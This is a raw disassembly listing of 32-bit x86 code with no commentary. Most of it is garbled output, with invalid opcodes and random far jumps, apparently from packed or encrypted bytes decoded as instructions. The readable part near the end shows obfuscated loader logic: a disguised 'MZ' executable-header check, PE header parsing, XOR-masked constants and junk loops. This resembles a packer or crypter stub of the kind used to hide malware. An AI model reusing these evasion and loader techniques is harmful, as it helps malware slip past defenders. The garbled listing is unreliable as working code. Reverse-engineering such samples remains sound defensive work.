  40c548:	push   ebx
  40c549:	jns    0x40c503
  40c54b:	pxor   mm4,QWORD PTR [esi+0xe581315]
  40c552:	nop
  40c553:	push   ecx
  40c554:	sar    BYTE PTR [eax-0x3a],0xc
  40c558:	push   es
  40c559:	out    0xcf,al
  40c55b:	jle    0x40c52f
  40c55d:	test   DWORD PTR [ebx+0x71],ecx
  40c560:	or     eax,0xc6389d21
  40c565:	sbb    eax,0x9eb95588
  40c56a:	jl     0x40c5c1
  40c56c:	pop    edx
  40c56d:	fldenv [edx-0x3fad658d]
  40c573:	jbe    0x40c5cb
  40c575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c576:	scas   al,BYTE PTR es:[edi]
  40c577:	cs pop ds
  40c579:	xchg   edi,eax
  40c57a:	arpl   cx,cx
  40c57c:	rol    ebx,1
  40c57e:	mov    ebp,0xa56d0734
  40c583:	popa   
  40c584:	mov    ds:0x4ff5cf74,al
  40c589:	cwde   
  40c58a:	and    BYTE PTR [ebx-0x3188590f],0x7b
  40c591:	fst    st(3)
  40c593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c594:	or     ch,BYTE PTR [edx+0x2a]
  40c597:	sub    eax,0xc11807d4
  40c59c:	popa   
  40c59d:	pop    esp
  40c59e:	or     eax,0x9b00f906
  40c5a3:	cmp    edi,DWORD PTR [ebp-0x32222f1f]
  40c5a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5aa:	fxtract 
  40c5ac:	loope  0x40c610
  40c5ae:	mov    ecx,0xf1fa2785
  40c5b3:	(bad)  
  40c5b4:	jo     0x40c537
  40c5b6:	jne    0x40c558
  40c5b8:	popf   
  40c5b9:	sbb    ebp,DWORD PTR [eax-0x4c71b441]
  40c5bf:	jno    0x40c54c
  40c5c1:	jecxz  0x40c5d0
  40c5c3:	jmp    DWORD PTR [esi-0x68bca2db]
  40c5c9:	inc    esi
  40c5ca:	call   0x6deed90a
  40c5cf:	mov    bl,0xf5
  40c5d1:	xlat   BYTE PTR ds:[ebx]
  40c5d2:	retf   0xa876
  40c5d5:	ficom  DWORD PTR [ecx+eax*4+0x77]
  40c5d9:	add    al,0x87
  40c5db:	and    DWORD PTR [esi-0x697960a5],esp
  40c5e1:	call   0xb530b6d2
  40c5e6:	cld    
  40c5e7:	push   edx
  40c5e8:	fmul   QWORD PTR [esi]
  40c5ea:	test   BYTE PTR [edx],0xb4
  40c5ed:	std    
  40c5ee:	push   ebp
  40c5ef:	mov    dh,0x9a
  40c5f1:	and    al,0x26
  40c5f3:	test   BYTE PTR [edi-0x23],bl
  40c5f6:	scas   al,BYTE PTR es:[edi]
  40c5f7:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5f9:	aas    
  40c5fa:	ffree  st(2)
  40c5fc:	push   es
  40c5fd:	xchg   edi,eax
  40c5fe:	(bad)  
  40c600:	call   0x110a:0x7d39c0b3
  40c607:	mov    ebx,DWORD PTR [esi]
  40c609:	xor    dl,al
  40c60b:	jo     0x40c67c
  40c60d:	xchg   DWORD PTR [ebx+esi*8+0x3208f7cb],ebp
  40c614:	ret    0xda5e
  40c617:	popf   
  40c618:	jmp    0x40c631
  40c61a:	push   es
  40c61b:	mov    ?,WORD PTR [eax-0x5feea4a8]
  40c621:	push   eax
  40c622:	ret    
  40c623:	adc    eax,0x1e552702
  40c628:	test   DWORD PTR [ebx],ecx
  40c62a:	add    al,0xc1
  40c62c:	(bad)  
  40c62d:	jnp    0x40c5d5
  40c62f:	jp     0x40c668
  40c631:	inc    ebx
  40c632:	inc    edi
  40c633:	sar    BYTE PTR ds:0xd85e734,cl
  40c639:	mov    esi,0xf3ad2421
  40c63e:	fsubr  QWORD PTR [esi-0x23]
  40c641:	pop    ebx
  40c642:	jmp    0xeac4:0x62faeff7
  40c649:	xchg   esp,eax
  40c64a:	dec    edx
  40c64b:	neg    DWORD PTR [eax+0x4a057f6f]
  40c651:	pop    ebx
  40c652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c653:	aad    0x54
  40c655:	dec    esi
  40c656:	cmp    eax,0xede0bd47
  40c65b:	add    DWORD PTR [edx],edx
  40c65d:	push   ds
  40c65e:	test   BYTE PTR [ecx+0x10],al
  40c661:	push   ebx
  40c662:	jg     0x40c604
  40c664:	ds (bad) 
  40c666:	rcr    DWORD PTR [ecx],1
  40c668:	fstp   TBYTE PTR [eax+0x7d]
  40c66b:	xchg   edx,eax
  40c66c:	jbe    0x40c68e
  40c66e:	cld    
  40c66f:	fadd   QWORD PTR [esi-0x3b5735c4]
  40c675:	dec    edx
  40c676:	jle    0x40c678
  40c678:	retf   
  40c679:	std    
  40c67a:	jb     0x40c6de
  40c67c:	mov    ecx,0xc2e4f924
  40c681:	pop    edx
  40c682:	sbb    DWORD PTR [eax],edi
  40c684:	ror    DWORD PTR [ebp-0x40],cl
  40c687:	pop    eax
  40c688:	call   0x3676:0xd35b4fd7
  40c68f:	dec    ecx
  40c690:	sbb    esp,ebx
  40c692:	ds add al,0x3d
  40c695:	cmp    edx,DWORD PTR [ebx+0x21]
  40c698:	test   al,0x16
  40c69a:	repz xor DWORD PTR [esi-0x2542e4f9],esi
  40c6a1:	push   edx
  40c6a2:	iret   
  40c6a3:	dec    ebx
  40c6a4:	or     BYTE PTR [edx-0x3a],bh
  40c6a7:	xor    ebp,edx
  40c6a9:	push   eax
  40c6aa:	(bad)  [esi-0x4b]
  40c6ad:	xchg   ebx,eax
  40c6ae:	lds    esi,FWORD PTR [ecx]
  40c6b0:	ins    DWORD PTR es:[edi],dx
  40c6b1:	mov    esp,0xe8c41d53
  40c6b6:	fstp   QWORD PTR [ebp+0x44a5a64c]
  40c6bc:	dec    ebx
  40c6bd:	fucomi st,st(6)
  40c6bf:	in     eax,dx
  40c6c0:	fisub  WORD PTR [edi+0x40]
  40c6c3:	jno    0x40c65e
  40c6c5:	test   BYTE PTR [ecx-0x3a],ah
  40c6c8:	cmp    DWORD PTR [eax],ecx
  40c6ca:	nop
  40c6cb:	ret    0xe533
  40c6ce:	daa    
  40c6cf:	xor    DWORD PTR [ebp+0x3970bb2d],edi
  40c6d5:	punpcklbw mm6,DWORD PTR [ebx+0x31]
  40c6d9:	push   0x5ff36ef4
  40c6de:	std    
  40c6df:	mov    al,ds:0x8ec25426
  40c6e4:	into   
  40c6e5:	adc    BYTE PTR [eax-0x30d333ad],bh
  40c6eb:	popf   
  40c6ec:	ds xchg ebp,eax
  40c6ee:	pop    ss
  40c6ef:	loop   0x40c69f
  40c6f1:	sub    dl,0x39
  40c6f4:	jmp    0x40c706
  40c6f6:	sbb    al,0x69
  40c6f8:	fnstenv [ebx-0x2c741d5a]
  40c6fe:	xchg   esp,eax
  40c6ff:	push   ds
  40c700:	jl     0x40c71c
  40c702:	inc    ecx
  40c703:	cmp    dh,bh
  40c705:	xchg   ecx,eax
  40c706:	push   esi
  40c707:	imul   BYTE PTR [ebp-0x38]
  40c70a:	icebp  
  40c70b:	push   esi
  40c70c:	pop    eax
  40c70d:	push   es
  40c70e:	add    cl,BYTE PTR [edi+0x1bcb640c]
  40c714:	inc    ebx
  40c715:	pop    esp
  40c716:	arpl   di,dx
  40c718:	pushf  
  40c719:	in     eax,0xcb
  40c71b:	arpl   si,di
  40c71d:	and    edi,ebp
  40c71f:	add    ch,al
  40c721:	adc    DWORD PTR [edi+ebx*8+0x4b3096cd],ebp
  40c728:	sub    BYTE PTR [ebp+0x53c62687],0x50
  40c72f:	mov    ecx,0x7d5e677f
  40c734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c735:	inc    edx
  40c736:	mov    ecx,0x5ae1d506
  40c73b:	pop    ss
  40c73c:	aas    
  40c73d:	scas   al,BYTE PTR es:[edi]
  40c73e:	inc    ecx
  40c73f:	push   ebp
  40c740:	sbb    dl,BYTE PTR [edi+0x1d]
  40c743:	inc    esp
  40c744:	pop    esp
  40c745:	mov    eax,ds:0x2fa82b15
  40c74b:	mov    ebp,0x841cd9d9
  40c750:	neg    bl
  40c752:	jmp    0xe0021cc4
  40c757:	lods   al,BYTE PTR ds:[esi]
  40c758:	mov    ds:0x5af2088d,al
  40c75d:	add    al,0xf8
  40c75f:	adc    bh,0x6c
  40c762:	mov    eax,ds:0x27fdb4e5
  40c767:	push   ds
  40c768:	push   eax
  40c769:	inc    esi
  40c76a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c76b:	sar    DWORD PTR [edx],0xc5
  40c76e:	ja     0x40c717
  40c770:	pop    ebp
  40c771:	xchg   ebx,eax
  40c772:	fwait
  40c773:	sub    bl,dh
  40c775:	out    dx,eax
  40c776:	push   esi
  40c777:	jae    0x40c769
  40c779:	cdq    
  40c77a:	rol    BYTE PTR [edx+0x2a5f4d37],cl
  40c780:	fisubr DWORD PTR [ecx-0x38d92985]
  40c786:	xor    eax,0x1d232d11
  40c78b:	jmp    0x9538:0xaa94b4b0
  40c792:	retf   
  40c793:	data16 cmp cl,bl
  40c796:	sbb    DWORD PTR [ebx-0x6],0xffffffc9
  40c79a:	xor    al,0xac
  40c79c:	xchg   DWORD PTR [edx-0x562ab71b],esi
  40c7a2:	jmp    0x40c803
  40c7a4:	stos   BYTE PTR es:[edi],al
  40c7a5:	imul   ebp,DWORD PTR [edi-0x52f8d578],0x28
  40c7ac:	mov    bh,0x61
  40c7ae:	call   0x5abf6bbe
  40c7b3:	rcl    DWORD PTR ds:[edi-0x68],0x24
  40c7b8:	pinsrw mm0,WORD PTR [ecx+0x539eebf7],0xc8
  40c7c0:	test   cl,dl
  40c7c2:	mov    ah,0x74
  40c7c4:	cmp    BYTE PTR ds:0xa9df4452,bh
  40c7ca:	loope  0x40c7eb
  40c7cc:	xor    al,BYTE PTR [esi]
  40c7ce:	mov    ds:0xf9dd731,al
  40c7d3:	in     al,0xae
  40c7d5:	aaa    
  40c7d6:	mov    ecx,DWORD PTR [ebp-0x8]
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	and    al,0x58
  40c801:	jg     0x40c86b
  40c803:	leave  
  40c804:	cmp    BYTE PTR [esi+0x7e],0x2e
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c87f
  40c80c:	call   0xe97d:0x37da2de6
  40c813:	stos   DWORD PTR es:[edi],eax
  40c814:	jb     0x40c7b0
  40c816:	aad    0x65
  40c818:	mov    ss:0xcffda4e3,eax
  40c81e:	mov    eax,0x7c7d04b7
  40c823:	xor    eax,0xf00391ae
  40c828:	push   edi
  40c829:	imul   eax,DWORD PTR [ebp+0x2b553d0e],0x2bcaf293
  40c833:	loop   0x40c873
  40c835:	xor    al,0x7e
  40c837:	das    
  40c838:	nop
  40c839:	mov    ch,0xe8
  40c83b:	cmp    ch,ch
  40c83d:	jmp    0x40c7c9
  40c83f:	pushf  
  40c840:	inc    ecx
  40c841:	push   0x778a6ad0
  40c846:	jmp    0x40c8b4
  40c848:	or     esi,DWORD PTR [edx+0xd]
  40c84b:	jl     0x40c890
  40c84d:	mov    bh,0x3d
  40c84f:	xor    DWORD PTR [ebx+ebx*4-0x6085e125],0x74
  40c857:	ret    0xe6c4
  40c85a:	repnz mov ebx,0xb5347156
  40c860:	inc    esp
  40c861:	add    eax,esi
  40c863:	jmp    0x78e85252
  40c868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c869:	add    al,0x4b
  40c86b:	dec    ecx
  40c86c:	rcr    DWORD PTR [esi+0x562fe46a],cl
  40c872:	cmc    
  40c873:	loope  0x40c8b7
  40c875:	cmc    
  40c876:	lea    esp,[esi]
  40c878:	lds    eax,FWORD PTR [esi+0x52526b84]
  40c87e:	dec    edi
  40c87f:	into   
  40c880:	mov    ch,0xba
  40c882:	inc    esp
  40c883:	pop    es
  40c884:	pop    edi
  40c885:	sub    eax,0x69099a62
  40c88a:	hlt    
  40c88b:	mov    esp,0x9201fc5
  40c890:	ins    BYTE PTR es:[edi],dx
  40c891:	push   eax
  40c892:	adc    eax,0x6f737bb9
  40c897:	(bad)  
  40c898:	push   0x5
  40c89a:	sbb    ebx,DWORD PTR [eax+0x1b]
  40c89d:	push   ecx
  40c89e:	xchg   edx,eax
  40c89f:	inc    edi
  40c8a0:	push   0x3170833f
  40c8a5:	sbb    bh,BYTE PTR [ebp+0x31909cf3]
  40c8ab:	lods   al,BYTE PTR ds:[esi]
  40c8ac:	adc    edx,DWORD PTR [ecx-0x12d5e563]
  40c8b2:	fmul   QWORD PTR [ebx+ebp*4+0x34084d1e]
  40c8b9:	arpl   WORD PTR [eax*1+0x445f1b9],bp
  40c8c0:	retf   
  40c8c1:	jo     0x40c8b4
  40c8c3:	scas   al,BYTE PTR es:[edi]
  40c8c4:	mov    bh,0xd3
  40c8c6:	(bad)  
  40c8c7:	push   0x42cc480
  40c8cc:	lock pop esi
  40c8ce:	mov    ebx,0x687c73ac
  40c8d3:	bound  esp,QWORD PTR [edi-0x68]
  40c8d6:	and    al,0x44
  40c8d8:	pushf  
  40c8d9:	mov    ch,0x6b
  40c8db:	in     eax,dx
  40c8dc:	stc    
  40c8dd:	in     al,dx
  40c8de:	or     BYTE PTR [ebx],ah
  40c8e0:	xchg   esi,eax
  40c8e1:	ins    DWORD PTR es:[edi],dx
  40c8e2:	jmp    0x7731:0xb493403a
  40c8e9:	aaa    
  40c8ea:	mov    eax,0xe27c2960
  40c8ef:	mov    esi,0xe15ee2d4
  40c8f4:	sub    al,0x98
  40c8f6:	dec    eax
  40c8f7:	inc    esi
  40c8f8:	add    BYTE PTR [ebx],dh
  40c8fa:	sti    
  40c8fb:	pop    ebx
  40c8fc:	inc    esi
  40c8fd:	adc    al,0x95
  40c8ff:	out    dx,eax
  40c900:	inc    esi
  40c901:	sub    BYTE PTR [edi],dl
  40c903:	loope  0x40c8b1
  40c905:	(bad)  
  40c906:	mov    esp,0xde55ff29
  40c90b:	inc    edi
  40c90c:	jns    0x40c96c
  40c90e:	inc    ebp
  40c90f:	fst    QWORD PTR [ebx+0xc]
  40c912:	sub    BYTE PTR [ecx+0x3ba955ad],bh
  40c918:	dec    ecx
  40c919:	add    esp,eax
  40c91b:	daa    
  40c91c:	fistp  QWORD PTR [edx-0xe]
  40c91f:	cmp    BYTE PTR [ebx-0x80],ah
  40c922:	sub    BYTE PTR [ebx-0x63],bl
  40c925:	inc    ebp
  40c926:	nop
  40c927:	ja     0x40c8ca
  40c929:	push   cs
  40c92a:	nop
  40c92b:	in     eax,0x9
  40c92d:	fstp   DWORD PTR [ebx+edi*1-0x32]
  40c931:	dec    ebp
  40c932:	cld    
  40c933:	popa   
  40c934:	scas   eax,DWORD PTR es:[edi]
  40c935:	and    BYTE PTR [edi+0x44],dl
  40c938:	mov    al,0xf1
  40c93a:	shl    DWORD PTR [esi],0xb8
  40c93d:	and    DWORD PTR [eax],edi
  40c93f:	ss sub ch,ch
  40c942:	test   al,0xe1
  40c944:	add    eax,0xd0094340
  40c949:	aam    0xf9
  40c94b:	adc    DWORD PTR [ebp+0x3e],edi
  40c94e:	mov    esp,0xc965ac19
  40c953:	in     eax,dx
  40c954:	es icebp 
  40c956:	repnz pop ebx
  40c958:	data16 aaa 
  40c95a:	dec    eax
  40c95b:	ret    
  40c95c:	xor    eax,DWORD PTR [ebp-0x25]
  40c95f:	(bad)  
  40c960:	repnz lahf 
  40c962:	sbb    DWORD PTR [ebx],edi
  40c964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c965:	call   DWORD PTR [esp+eax*2-0x5]
  40c969:	das    
  40c96a:	pop    ecx
  40c96b:	mov    dh,0x72
  40c96d:	mov    esi,0x776cc865
  40c972:	call   0x51a1:0xfa6a1455
  40c979:	(bad)  
  40c97a:	cli    
  40c97b:	std    
  40c97c:	cmp    esp,ecx
  40c97e:	cmp    esp,ebx
  40c980:	(bad)  
  40c981:	out    dx,eax
  40c982:	push   edx
  40c983:	in     eax,0x55
  40c985:	or     cl,BYTE PTR [esi+0x70903e9a]
  40c98b:	ror    BYTE PTR [esi-0x1654ea5],1
  40c991:	sub    bh,0x9c
  40c994:	daa    
  40c995:	jo     0x40c972
  40c997:	(bad)  
  40c999:	test   al,0xb8
  40c99b:	or     BYTE PTR [edx+0x505b0cc9],dh
  40c9a1:	adc    al,0xbf
  40c9a3:	mov    bl,0xbf
  40c9a5:	outs   dx,DWORD PTR ds:[esi]
  40c9a6:	jnp    0x40c97e
  40c9a8:	push   es
  40c9a9:	mov    ebp,0x345534d3
  40c9ae:	retf   
  40c9af:	ficom  DWORD PTR ss:[esi-0x2d1b3569]
  40c9b6:	hlt    
  40c9b7:	push   esp
  40c9b8:	aaa    
  40c9b9:	inc    edi
  40c9ba:	nop    eax
  40c9bd:	mov    ebp,0xd4b40e20
  40c9c2:	imul   eax,DWORD PTR [ecx],0x45587ae1
  40c9c8:	add    BYTE PTR [ebp-0x77b0219b],al
  40c9ce:	lods   eax,DWORD PTR ds:[esi]
  40c9cf:	ror    BYTE PTR [ebx],1
  40c9d1:	jno    0x40ca51
  40c9d3:	pop    ebp
  40c9d4:	sub    BYTE PTR [ebx+0x3f],bh
  40c9d7:	sub    ah,ah
  40c9d9:	cld    
  40c9da:	cmovns esp,edx
  40c9dd:	dec    ebp
  40c9de:	je     0x40ca2b
  40c9e0:	mov    bl,0x73
  40c9e2:	js     0x40c9c4
  40c9e4:	push   0x859de1a5
  40c9e9:	sbb    eax,DWORD PTR ds:0x4cd7fe34
  40c9ef:	(bad)  
  40c9f0:	push   edx
  40c9f1:	xor    dh,ah
  40c9f3:	dec    eax
  40c9f4:	xchg   ebp,edx
  40c9f6:	cld    
  40c9f7:	jnp    0x40c9e4
  40c9f9:	ds or  al,0x55
  40c9fc:	mov    edx,0xb51cec85
  40ca01:	fild   DWORD PTR [esi-0x80]
  40ca04:	mov    bh,0xce
  40ca06:	lods   al,BYTE PTR ds:[esi]
  40ca07:	imul   edi
  40ca09:	popa   
  40ca0a:	xchg   BYTE PTR [edx-0x4e],bh
  40ca0d:	sbb    DWORD PTR [edx],ecx
  40ca0f:	mov    dh,0xaa
  40ca11:	push   ecx
  40ca12:	push   ebp
  40ca13:	xchg   esp,eax
  40ca14:	push   ebx
  40ca15:	inc    esp
  40ca16:	xchg   esp,eax
  40ca17:	add    edi,ebx
  40ca19:	mov    esi,0x8249b2db
  40ca1e:	mov    edx,0xee2dc6df
  40ca23:	and    al,0x9b
  40ca25:	jmp    0x8e16:0xe0b005b1
  40ca2c:	and    al,0x9d
  40ca2e:	dec    ecx
  40ca2f:	sar    BYTE PTR [eax+0x21],cl
  40ca32:	jg     0x40c9df
  40ca34:	adc    eax,0xe97627a8
  40ca39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca3a:	jp     0x40c9fc
  40ca3c:	jb     0x40ca9d
  40ca3e:	pushf  
  40ca3f:	fwait
  40ca40:	sbb    BYTE PTR [ebx+0x685b42d7],al
  40ca46:	hlt    
  40ca47:	int    0xf2
  40ca49:	dec    esp
  40ca4a:	es dec esp
  40ca4c:	lahf   
  40ca4d:	in     al,dx
  40ca4e:	and    eax,0xd35e3d4d
  40ca53:	mov    bl,cl
  40ca55:	inc    ebx
  40ca56:	std    
  40ca57:	push   edi
  40ca58:	(bad)  
  40ca59:	mov    bh,dl
  40ca5b:	sub    BYTE PTR ds:[ecx+0x72],ah
  40ca5f:	gs mov edx,0x89424c33
  40ca65:	lahf   
  40ca66:	xchg   edx,eax
  40ca67:	or     BYTE PTR [ebp+0x4c1fba68],bh
  40ca6d:	pop    esp
  40ca6e:	jecxz  0x40caef
  40ca70:	mov    edi,0xd70bcfdd
  40ca75:	cld    
  40ca76:	mov    ecx,esi
  40ca78:	(bad)  
  40ca79:	push   esi
  40ca7a:	mov    al,ds:0x3d4df12
  40ca7f:	js     0x40cabc
  40ca81:	xchg   dh,dl
  40ca83:	xchg   DWORD PTR [esi],ecx
  40ca85:	add    eax,0xf02ca14f
  40ca8a:	retf   
  40ca8b:	jl     0x40caf2
  40ca8d:	and    esp,DWORD PTR [edi-0x2a]
  40ca90:	inc    ecx
  40ca91:	mov    DWORD PTR [ecx+0x3d5d93cf],esi
  40ca97:	xor    DWORD PTR [esi+0x59],edi
  40ca9a:	jcxz   0x40ca87
  40ca9d:	loop   0x40ca97
  40ca9f:	sub    al,0x5
  40caa1:	outs   dx,DWORD PTR ds:[esi]
  40caa2:	data16 jae 0x40ca3a
  40caa5:	sbb    al,0x62
  40caa7:	dec    DWORD PTR [ecx+0x7b]
  40caaa:	loope  0x40cade
  40caac:	pop    edi
  40caad:	ja     0x40ca39
  40caaf:	jl     0x40ca66
  40cab1:	loope  0x40cb29
  40cab3:	sar    BYTE PTR [edx+0x704d966f],0x84
  40caba:	sbb    al,0x86
  40cabc:	in     al,dx
  40cabd:	and    al,0x66
  40cabf:	sti    
  40cac0:	cmp    al,ch
  40cac2:	mov    BYTE PTR [edi-0x69a6bcdd],dl
  40cac8:	sbb    ecx,DWORD PTR [esi-0x14fe5336]
  40cace:	mov    eax,0x51770e24
  40cad3:	stos   BYTE PTR es:[edi],al
  40cad4:	dec    edi
  40cad5:	push   0xdd161e38
  40cada:	popa   
  40cadb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cadc:	inc    esp
  40cadd:	je     0x40cafa
  40cadf:	push   0xffffff99
  40cae1:	sbb    al,ah
  40cae3:	adc    edi,eax
  40cae5:	popf   
  40cae6:	pushf  
  40cae7:	push   esp
  40cae8:	jmp    0x9d99:0x704308ee
  40caef:	or     al,0x24
  40caf1:	adc    DWORD PTR [eax-0x44987c2c],edi
  40caf7:	bound  edx,QWORD PTR ds:0x5f12f620
  40cafd:	bound  ebx,QWORD PTR fs:[esi-0x605ed87a]
  40cb04:	in     eax,0x64
  40cb06:	push   ebp
  40cb07:	and    eax,0x35b51984
  40cb0c:	mov    ebx,0x9d9a1a5e
  40cb11:	mov    ds:0xc27a670b,al
  40cb16:	(bad)  [esi-0xe]
  40cb19:	test   al,0xf2
  40cb1b:	jle    0x40caac
  40cb1d:	xor    ebp,edx
  40cb1f:	pop    eax
  40cb20:	push   edx
  40cb21:	sahf   
  40cb22:	xchg   esi,eax
  40cb23:	xchg   edx,eax
  40cb24:	mov    DWORD PTR [ebx-0x37],edi
  40cb27:	or     eax,0x6406d872
  40cb2c:	push   0x1815137e
  40cb31:	stos   BYTE PTR es:[edi],al
  40cb32:	mov    dl,0x8c
  40cb34:	(bad)  
  40cb35:	sbb    BYTE PTR [edi-0x22],ch
  40cb38:	add    eax,0x4d8bb406
  40cb3d:	loopne 0x40cb72
  40cb3f:	mov    BYTE PTR [ebx],0xc7
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x4302d5,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x4302d5
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x4302d5,eax
  40cbe0:	cmp    DWORD PTR ds:0x4302d5,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x4302d5,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42e88b
  40cc05:	cmp    DWORD PTR ds:0x4302d5,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x4302d5
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x4302d5,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x4302bd,0x0
  40cc2f:	mov    eax,ds:0x4302bd
  40cc34:	inc    eax
  40cc35:	mov    ds:0x4302bd,eax
  40cc3a:	cmp    DWORD PTR ds:0x4302bd,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e797
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42e94b
  40cc6b:	cmp    DWORD PTR ds:0x4302bd,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e64c,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x430357,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ecd9
  40cd16:	mov    eax,ds:0x4302fd
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42ec57
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x4302ed,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x430367,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e640,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x4302f1,0x42ec4f
  40cd68:	add    eax,DWORD PTR ds:0x412224
